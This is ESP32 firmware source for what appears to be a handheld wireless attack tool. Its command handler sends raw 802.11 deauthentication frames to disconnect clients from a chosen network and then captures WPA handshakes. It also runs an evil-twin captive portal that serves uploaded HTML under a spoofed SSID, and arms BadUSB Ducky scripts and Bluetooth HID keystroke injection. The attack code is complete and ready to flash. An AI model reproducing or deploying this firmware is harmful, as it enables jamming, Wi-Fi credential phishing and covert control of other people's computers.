#include <Arduino.h>
#include <ArduinoJson.h>
#include <esp_wifi.h>
#include "BridgeProtocol.h"
#include "sniffer.h"
#include "portal.h"
#include "mbedtls/base64.h"
#include "Preferences.h"
#ifdef ENABLE_BLE_HID
#include "ble_hid.h"
#endif

#if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
    #define MSC_SUPPORTED 1
    #define HID_SUPPORTED 1
    #include "mass_storage.h"
    #include "FileUpload.h"
    #include "UsbHID.h"
#else
    #define MSC_SUPPORTED 0
    #define HID_SUPPORTED 0
#endif

// ── Chip name ────────────────────────────────────────────────────────────────
#if defined(CONFIG_IDF_TARGET_ESP32C3)
    #define CHIP_NAME "ESP32-C3"
#elif defined(CONFIG_IDF_TARGET_ESP32S3)
    #define CHIP_NAME "ESP32-S3"
#elif defined(CONFIG_IDF_TARGET_ESP32S2)
    #define CHIP_NAME "ESP32-S2"
    #define LED_PIN 17
#else
    #define CHIP_NAME "ESP32"
#endif

BridgeProtocol proto(Serial);
Sniffer        sniffer;
PortalManager  portal;

// ── IDF-level scan ───────────────────────────────────────────────────────────
static volatile bool _scanDone = false;
static uint16_t g_lastHtmlSeq = 0xFFFF;

static void wifiEventHandler(arduino_event_id_t event) {
    if (event == ARDUINO_EVENT_WIFI_SCAN_DONE) _scanDone = true;
}

static int idf_scan_networks(BridgeProtocol& proto) {
    wifi_scan_config_t cfg = {};
    cfg.ssid        = nullptr;
    cfg.bssid       = nullptr;
    cfg.channel     = 0;
    cfg.show_hidden = true;
    cfg.scan_type   = WIFI_SCAN_TYPE_ACTIVE;
    cfg.scan_time.active.min = 100;
    cfg.scan_time.active.max = 300;

    _scanDone = false;
    WiFi.onEvent(wifiEventHandler);

    esp_err_t err = esp_wifi_scan_start(&cfg, false);
    if (err != ESP_OK) return -1;

    uint32_t deadline = millis() + 8000;
    while (!_scanDone && millis() < deadline) {
        proto.update();
        vTaskDelay(pdMS_TO_TICKS(20));
    }

    if (!_scanDone) {
        esp_wifi_scan_stop();
        return -1;
    }

    uint16_t count = 0;
    esp_wifi_scan_get_ap_num(&count);
    return (int)count;
}

static bool parseMac(const char* str, uint8_t out[6]) {
    if (!str || !str[0]) return false;
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]) == 6;
}

static const char* authModeStr(wifi_auth_mode_t mode) {
    switch (mode) {
        case WIFI_AUTH_OPEN:            return "OPEN";
        case WIFI_AUTH_WEP:             return "WEP";
        case WIFI_AUTH_WPA_PSK:         return "WPA-PSK";
        case WIFI_AUTH_WPA2_PSK:        return "WPA2-PSK";
        case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/WPA2-PSK";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-ENTERPRISE";
        case WIFI_AUTH_WPA3_PSK:        return "WPA3-PSK";
        case WIFI_AUTH_WPA2_WPA3_PSK:   return "WPA2/WPA3-PSK";
        case WIFI_AUTH_WAPI_PSK:        return "WAPI-PSK";
        default:                        return "UNKNOWN";
    }
}

static void radioIdle() {
    sniffer.stop();
    esp_wifi_set_promiscuous(false);
    vTaskDelay(pdMS_TO_TICKS(80));
}

// ── Command Handler ──────────────────────────────────────────────────────────
void handleCmd(uint8_t id, JsonDocument& doc) {
    const char* cmd = doc["cmd"] | "";
    if (cmd[0] == '\0') {
        proto.sendResp(id, false, "missing cmd");
        return;
    }

    // ── PING ──────────────────────────────────────────────────────────────
    if (strcmp(cmd, "PING") == 0) {
        proto.sendResp(id, true, "pong");
    }

    // ── STATUS ────────────────────────────────────────────────────────────
    else if (strcmp(cmd, "STATUS") == 0 || strcmp(cmd, "HEAP") == 0) {
        JsonDocument resp;
        resp["ok"]       = true;
        resp["uptime"]   = millis();
        resp["heap"]     = ESP.getFreeHeap();
        resp["chip"]     = CHIP_NAME;
        resp["sniffing"] = sniffer.active();
        resp["oversized_frames"] = proto.oversizedFrameCount();
        if (sniffer.active()) {
            resp["channel"] = sniffer.channel();
        }
        resp["portal"]   = portal.isRunning();
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── START_SNIFF ──────────────────────────────────────────────────────
    else if (strcmp(cmd, "START_SNIFF") == 0) {
        const char* mode      = doc["args"]["mode"] | "fixed";
        bool        eapolOnly = doc["args"]["eapol_only"] | false;
        const char* bssidStr  = doc["args"]["bssid"] | "";

        uint8_t bssid[6];
        bool hasBssid = parseMac(bssidStr, bssid);
        sniffer.setEapolFilter(eapolOnly, hasBssid ? bssid : nullptr);

        bool ok;
        if (strcmp(mode, "hop") == 0) {
            uint16_t interval = doc["args"]["interval_ms"] | 300;
            ok = sniffer.startHop(interval);
        } else {
            uint8_t channel = doc["args"]["channel"] | 1;
            ok = sniffer.startFixed(channel);
        }

        proto.sendResp(id, ok, ok ? "sniffing started" : "invalid channel");
    }

    // ── STOP_SNIFF ────────────────────────────────────────────────────────
    else if (strcmp(cmd, "STOP_SNIFF") == 0) {
        SniffStats s = sniffer.stats();
        sniffer.stop();
        JsonDocument resp;
        resp["ok"]       = true;
        resp["captured"] = s.captured;
        resp["sent"]     = s.sent;
        resp["dropped"]  = s.dropped;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── SET_CHANNEL ──────────────────────────────────────────────────────
    else if (strcmp(cmd, "SET_CHANNEL") == 0) {
        uint8_t channel = doc["args"]["channel"] | 1;
        bool ok = sniffer.setChannel(channel);
            proto.sendResp(id, ok, ok ? "channel set" : "invalid channel (must be 1-13)");
    }

    // ── SCAN_WIFI ─────────────────────────────────────────────────────────
    else if (strcmp(cmd, "SCAN_WIFI") == 0) {
        bool wasSniffing = sniffer.active();
        uint8_t prevChannel = sniffer.channel();
        bool wasHopping = sniffer.hopping();

        radioIdle();

        int n = idf_scan_networks(proto);
        if (n < 0) {
            proto.sendResp(id, false, "scan failed");
            return;
        }

        if (n > 0) {
            uint16_t count = (uint16_t)n;
            wifi_ap_record_t* records = (wifi_ap_record_t*)malloc(
                count * sizeof(wifi_ap_record_t));

            if (records && esp_wifi_scan_get_ap_records(&count, records) == ESP_OK) {
                for (int i = 0; i < count; i++) {
                    char bssid_str[18];
                    snprintf(bssid_str, sizeof(bssid_str),
                             "%02X:%02X:%02X:%02X:%02X:%02X",
                             records[i].bssid[0], records[i].bssid[1],
                             records[i].bssid[2], records[i].bssid[3],
                             records[i].bssid[4], records[i].bssid[5]);

                    JsonDocument ev;
                    ev["ssid"]     = (char*)records[i].ssid;
                    ev["bssid"]    = bssid_str;
                    ev["channel"]  = records[i].primary;
                    ev["rssi"]     = records[i].rssi;
                    ev["security"] = authModeStr(records[i].authmode);
                    proto.sendEvent("scan_ap", ev);
                }
            }
            free(records);
        }

        esp_wifi_scan_stop();

        JsonDocument resp;
        resp["ok"] = true;
        resp["count"] = n;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());


        if (wasSniffing) {
            if (wasHopping) sniffer.startHop(300);
            else sniffer.startFixed(prevChannel);
        }
    }

    // ── DEAUTH / DEAUTH_CAPTURE ──────────────────────────────────────────
    // ★ FIXED: channel sync, esp_wifi_start(), error checking, for-loop
    else if (strcmp(cmd, "DEAUTH") == 0 || strcmp(cmd, "DEAUTH_CAPTURE") == 0) {
        JsonVariant args = doc["args"];

        // Robust parsing with sane defaults
        uint8_t  channel    = args["channel"].as<uint8_t>() ? args["channel"].as<uint8_t>() : 1;
        uint32_t count      = args["count"].as<uint32_t>()   ? args["count"].as<uint32_t>()   : 150;
        uint8_t  reason     = args["reason"].as<uint8_t>()  ? args["reason"].as<uint8_t>()  : 7;

        uint16_t intervalMs = 100;
        if (args.containsKey("deauth_interval_ms")) {
            intervalMs = args["deauth_interval_ms"].as<uint16_t>();
        } else if (args.containsKey("interval")) {
            intervalMs = args["interval"].as<uint16_t>();
        }

        const char* bssidStr  = args["bssid"]  | "00:00:00:00:00:00";
        const char* clientStr = args["client"] | "FF:FF:FF:FF:FF:FF";

        uint8_t bssid[6] = {0};
        uint8_t client[6] = {0};
        parseMac(bssidStr, bssid);
        parseMac(clientStr, client);

        // Stop sniffing and set radio channel
        radioIdle();
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

        // ★ CRITICAL FIX: sync the AP interface channel with the radio
        wifi_config_t ap_cfg = {};
        if (esp_wifi_get_config(WIFI_IF_AP, &ap_cfg) == ESP_OK) {
            ap_cfg.ap.channel = channel;
            esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
        }
        esp_wifi_start();        // ensure WiFi stack is fully operational
        delay(250);             // let the radio settle


        // Build deauth frame template
        uint8_t deauth_frame[26] = {
            0xC0, 0x00, 0x00, 0x00,
            0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,   // Addr1 (Client)
            0x00,0x00,0x00,0x00,0x00,0x00,   // Addr2 (BSSID)
            0x00,0x00,0x00,0x00,0x00,0x00,   // Addr3 (BSSID)
            0x00, 0x00, 0x00, 0x07            // Seq + Reason
        };

        memcpy(deauth_frame + 4,  client, 6);
        memcpy(deauth_frame + 10, bssid,  6);
        memcpy(deauth_frame + 16, bssid,  6);

        uint32_t total_sent = 0;
        uint16_t seq = 0x0010;

        for (uint32_t i = 0; i < count; i++) {
            deauth_frame[22] = seq & 0xFF;
            deauth_frame[23] = (seq >> 8) & 0xFF;
            deauth_frame[25] = reason;

            esp_err_t tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, 26, true);
            if (tx_err == ESP_OK) total_sent++;

            seq += 0x0010;
            delay(intervalMs);
        }

        // Optionally start EAPOL capture after deauth
        if (strcmp(cmd, "DEAUTH_CAPTURE") == 0) {
            sniffer.setEapolFilter(true, bssid);
            sniffer.startFixed(channel);
        }

        // Send stats
        JsonDocument statsDoc;
        statsDoc["status"]       = "finished";
        statsDoc["bssid"]        = bssidStr;
        statsDoc["client"]       = clientStr;
        statsDoc["channel"]      = (int)channel;
        statsDoc["count"]        = count;
        statsDoc["interval_ms"]  = intervalMs;
        statsDoc["reason"]       = reason;
        statsDoc["sent_frames"]  = total_sent;
        proto.sendEvent("deauth_stats", statsDoc);

        proto.sendResp(id, true, "deauth completed");
    }

    // ── CAPTIVE PORTAL ────────────────────────────────────────────────────
    else if (strcmp(cmd, "START_PORTAL") == 0) {
        const char* ssid = doc["args"]["ssid"] | "Home Network";
        uint8_t channel = doc["args"]["channel"] | 6;
        const char* bssidStr = doc["args"]["bssid"] | "";

        uint8_t targetBssid[6] = {0};
        bool hasTarget = parseMac(bssidStr, targetBssid);

        bool started = portal.start(ssid, channel, hasTarget ? targetBssid : nullptr);
        if (started) {
            proto.sendResp(id, true, "portal started");
        } else {
            proto.sendResp(id, false, "softAP failed");
        }
    }

    else if (strcmp(cmd, "STOP_PORTAL") == 0) {
        portal.stop();
        proto.sendResp(id, true);
    }

    else if (strcmp(cmd, "RESET_HTML") == 0) {
        size_t expectedSize = doc["args"]["size"] | 0;
        bool ok = portal.resetHtml(expectedSize);
        proto.sendResp(id, ok);
    }


    else if (strcmp(cmd, "SET_HTML_CHUNK") == 0) {

        const char* b64data = doc["args"]["data"] | (const char*)nullptr;
        bool last           = doc["args"]["last"]  | false;

        if (!b64data) {
            proto.sendResp(id, false, "missing data");
            return;
        }

        size_t b64len = strlen(b64data);
        size_t outCap = ((b64len + 3) / 4) * 3 + 2;

        // Use heap, not stack
        uint8_t* outBuf = (uint8_t*)heap_caps_malloc(outCap, MALLOC_CAP_8BIT);
        if (!outBuf) {
            proto.sendResp(id, false, "oom");
            return;
        }

        size_t outLen = 0;
        int ret = mbedtls_base64_decode(outBuf, outCap, &outLen,
                                        (const unsigned char*)b64data, b64len);
        if (ret == 0) {
            portal.setHtmlChunk(outBuf, outLen, last);
            char msg[32];
            snprintf(msg, sizeof(msg), "ok %dB->%dB", (int)b64len, (int)outLen);
            proto.sendResp(id, true);
        } else {
            char msg[40];
            snprintf(msg, sizeof(msg), "b64 fail ret=%d", ret);
            proto.sendResp(id, false, "decode failed");
        }

        heap_caps_free(outBuf);
    }

    else if (strcmp(cmd, "PORTAL_STATUS") == 0) {
        JsonDocument resp;
        resp["ok"] = true;
        resp["running"] = portal.isRunning();
        resp["html_size"] = portal.getBufferSize();
        resp["html_complete"] = portal.isComplete();
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }
    #ifdef ENABLE_BLE_HID
    else if (strcmp(cmd, "BLE_START") == 0) {
        const char* name = doc["args"]["name"] | "NRSuite_Keyboard";
        BleHid::begin(String(name));
        proto.sendResp(id, true, "ble started");
    }

    else if (strcmp(cmd, "BLE_STATUS") == 0) {
        JsonDocument resp;
        resp["ok"]          = true; 
        resp["connected"]   = BleHid::isConnected();
        resp["advertising"] = BleHid::isAdvertising();   // ← NEW
        resp["peer"]        = BleHid::peerAddress();
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "BLE_STOP") == 0) {
        BleHid::end();
        proto.sendResp(id, true, "ble stopped");
    }

    else if (strcmp(cmd, "BLE_RUN_SCRIPT") == 0) {
        const char* script = doc["args"]["script"] | "";
        if (script[0] == '\0') {
            proto.sendResp(id, false, "missing script");
        } else if (!BleHid::isConnected()) {
            proto.sendResp(id, false, "not paired");
        } else {
            int lines = BleHid::runScript(String(script));
            JsonDocument resp;
            resp["ok"]    = true;
            resp["lines"] = lines;
            String json; serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
        }
    }

    else if (strcmp(cmd, "BLE_STOP_SCRIPT") == 0) {
        BleHid::stop();
        proto.sendResp(id, true, "script stopped");
    }

    else if (strcmp(cmd, "BLE_KEY_DOWN") == 0) {
        const char* key = doc["args"]["key"] | "";
        if (key[0] == '\0' || !BleHid::isConnected()) {
            proto.sendResp(id, false, key[0] == '\0' ? "missing key" : "not paired");
        } else {
            BleHid::keyDown(String(key));
            proto.sendResp(id, true);
        }
    }

    else if (strcmp(cmd, "BLE_KEY_UP") == 0) {
        const char* key = doc["args"]["key"] | "";
        if (key[0] == '\0' || !BleHid::isConnected()) {
            proto.sendResp(id, false, key[0] == '\0' ? "missing key" : "not paired");
        } else {
            BleHid::keyUp(String(key));
            proto.sendResp(id, true);
        }
    }

    else if (strcmp(cmd, "BLE_RELEASE_ALL") == 0) {
        BleHid::releaseAll();
        proto.sendResp(id, true);
    }
    #endif

    else if (strcmp(cmd, "START_MSC") == 0) {
        #if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
            proto.sendResp(id, true, "rebooting into mass storage mode");
            delay(100);
            Preferences prefs;
            prefs.begin("boot", false);
            prefs.putBool("msc_mode", true);
            prefs.end();
            proto.sendResp(id, true, "rebooting into mass storage mode");
            delay(100);
            esp_restart();
        #else
            proto.sendResp(id, false, "mass storage not supported on this chip");
        #endif
    }

    // File upload to mass storage
    else if (strcmp(cmd, "SET_FILE_CHUNK") == 0) {
        #if MSC_SUPPORTED
            const char* filename = doc["args"]["filename"] | (const char*)nullptr;
            const char* b64data  = doc["args"]["data"]     | (const char*)nullptr;
            bool last            = doc["args"]["last"]     | false;

            if (!filename || !b64data) {
                proto.sendResp(id, false, "missing filename or data");
                return;
            }

            size_t b64len = strlen(b64data);
            size_t outCap = ((b64len + 3) / 4) * 3 + 2;

            uint8_t* outBuf = (uint8_t*)heap_caps_malloc(outCap, MALLOC_CAP_8BIT);
            if (!outBuf) {
                proto.sendResp(id, false, "oom");
                return;
            }

            size_t outLen = 0;
            int ret = mbedtls_base64_decode(outBuf, outCap, &outLen,
                                            (const unsigned char*)b64data, b64len);
            if (ret == 0) {
                bool ok = FileUpload::addChunk(filename, outBuf, outLen, last);
                if (last) {
                    proto.sendResp(id, ok, ok ? "file written" : "write failed or rejected extension");
                } else {
                    proto.sendResp(id, ok, ok ? "chunk ok" : "rejected (bad extension?)");
                }
            } else {
                proto.sendResp(id, false, "decode failed");
            }

            heap_caps_free(outBuf);
        #else
            proto.sendResp(id, false, "storage not supported on this chip");
        #endif
    }

    else if (strcmp(cmd, "START_BADUSB") == 0) {
        #if HID_SUPPORTED
            const char* filename = doc["args"]["filename"] | (const char*)nullptr;
            bool        startMSC = doc["args"]["msc"] | false;
            if (!filename) { proto.sendResp(id, false, "Ducky script is missing!"); return; }
            bool ok = UsbHID::armScript(filename, startMSC);
            proto.sendResp(id, ok, ok ? "Armed successfully" : "failed to arm");
            #if defined(CONFIG_IDF_TARGET_ESP32S2)
            digitalWrite(LED_PIN, HIGH);
            #endif
        #else
            proto.sendResp(id, false, "HID not supported on this chip");
        #endif
    }

    else {
        proto.sendResp(id, false, "unknown command");
    }
}

void handleAck(uint32_t chunk_index) {
    sniffer.onAck(chunk_index);
}

void sendHeartbeat() {
    static uint32_t last = 0;
    if (millis() - last < 5000) return;
    last = millis();

    JsonDocument doc;
    doc["uptime"] = millis();
    doc["heap"]   = ESP.getFreeHeap();
    proto.sendEvent("heartbeat", doc);
}

// ── Setup ──────────────────────────────────────────────────────────────────
void setup() {
    Keyboard.begin();
    Preferences prefs;
    prefs.begin("boot", false);
    bool mscMode = prefs.getBool("msc_mode", false);

    if (mscMode) prefs.putBool("msc_mode", false);


    prefs.end();

    #if (MSC_SUPPORTED || HID_SUPPORTED)
    if (mscMode) {
        MassStorage::setup();   // USB.begin() called fresh, nothing else has touched USB yet
        while (true) delay(1000);
    } else if(UsbHID::runIfArmed()) {
        while (true) delay(1000);
    }
    #endif

    Serial.setRxBufferSize(4096);
    Serial.begin(115200);
    delay(150);

    #if defined(CONFIG_IDF_TARGET_ESP32S2)
        pinMode(LED_PIN, OUTPUT);
    #endif

    // ── ONE-TIME radio init: APSTA and nothing else ever again ──────────────
    // ★ FIXED: removed the redundant first AP config block.
    // The one and only WiFi.mode() call is right here.
    WiFi.mode(WIFI_MODE_APSTA);

    // Configure a minimal hidden AP so WIFI_IF_AP is always valid for TX.
    wifi_config_t ap_cfg = {};
    strcpy((char*)ap_cfg.ap.ssid, "nrcap32");
    ap_cfg.ap.ssid_len       = 7;
    ap_cfg.ap.ssid_hidden    = 1;
    ap_cfg.ap.max_connection = 0;
    ap_cfg.ap.channel        = 1;  // default, will be changed by deauth/portal
    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);

    // Ensure promiscuous is OFF at boot
    esp_wifi_set_promiscuous(false);

    // Initialise subsystems
    proto.onCmd(handleCmd);
    proto.onAck(handleAck);

    proto.onHtml([](const uint8_t* data, size_t len) {
        if (len < 3) return;  // need at least seq(2) + isLast(1)

        uint16_t seq;
        memcpy(&seq, data, 2);
        bool isLast = data[2] != 0;
        const uint8_t* payload = data + 3;
        size_t payloadLen = len - 3;

        if (g_lastHtmlSeq != 0xFFFF && seq <= g_lastHtmlSeq) {
            // old or duplicate chunk — already applied, just re-ACK, don't reapply
        } else {
            portal.setHtmlChunk(payload, payloadLen, isLast);
            g_lastHtmlSeq = seq;
        }

        JsonDocument doc;
        doc["ok"]  = true;
        doc["seq"] = seq;
        String json;
        serializeJson(doc, json);
        proto.sendRaw(TYPE_RESP, 0, (const uint8_t*)json.c_str(), json.length());
    });


    sniffer.begin(proto);
    portal.begin(proto);

}

// ── Loop ───────────────────────────────────────────────────────────────────
void loop() {
    proto.update();
    sendHeartbeat();
    
    sniffer.processQueue();
    sniffer.handleHop();
    portal.update();

    static uint32_t lastRefresh = 0;
    if (millis() - lastRefresh > 2500) {
        lastRefresh = millis();
        if (sniffer.active()) {
            // 
        }
    }
}